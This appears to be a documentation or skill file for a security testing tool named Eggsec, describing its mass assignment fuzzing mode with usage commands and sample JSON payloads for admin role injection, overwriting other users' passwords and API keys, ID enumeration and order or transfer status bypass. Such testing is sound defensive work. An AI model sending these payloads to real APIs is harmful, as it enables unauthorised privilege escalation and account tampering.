---
name: mass_assignment
description: "Mass assignment vulnerability testing for API endpoints"
triggers:
  - mass assignment
  - over-posting
  - insecure direct object reference
  - api vulnerability
  - parameter pollution
metadata:
  category: fuzzing
  tools: [fuzzer]
  scope: web_targets
---

## Overview

Eggsec supports mass assignment testing. Mass assignment vulnerabilities occur when applications automatically bind user input to internal object properties without proper filtering, allowing attackers to modify fields they shouldn't.

## Payload Categories

| Category | Count | Description |
|----------|-------|-------------|
| Admin Privileges | 10+ | Role/admin field injection |
| Sensitive Fields | 8+ | Password, token, ID fields |
| ID Manipulation | 7+ | Object ID enumeration |
| Status Fields | 8+ | Bypass status checks |
| Bypass Wildcard | 5+ | Nested field wildcards |
| Nested Objects | 6+ | Deep property injection |

## Usage

```bash
# Basic mass assignment scan
eggsec fuzzer --target http://target.com/api/user --payload-type mass_assign

# JSON API target
eggsec fuzzer --target http://target.com/api/profile --payload-type mass_assign -H "Content-Type: application/json"
```

## Injection Techniques

### Admin Privilege Escalation
```json
{"username": "user", "role": "admin"}
{"username": "user", "is_admin": true}
{"username": "user", "permissions": ["read", "write", "admin"]}
```

### Sensitive Field Access
```json
{"user_id": 9999, "password": "hacked"}
{"user_id": 9999, "api_key": "secret"}
{"id": "123", "_token": "bearer"}
```

### ID Enumeration
```json
{"user_id": 1}
{"user_id": 2}
{"user_id": 3}
```

### Status Field Bypass
```json
{"order_id": "123", "status": "shipped"}
{"transfer_id": "456", "status": "approved"}
```

## Triggers

Keywords: mass assignment, over-posting, insecure direct object reference, api vulnerability, parameter pollution, field injection

## References

- `fuzzer/payloads/mass_assign.rs` - Payload implementations
- `PayloadType::MassAssign` - Integration point
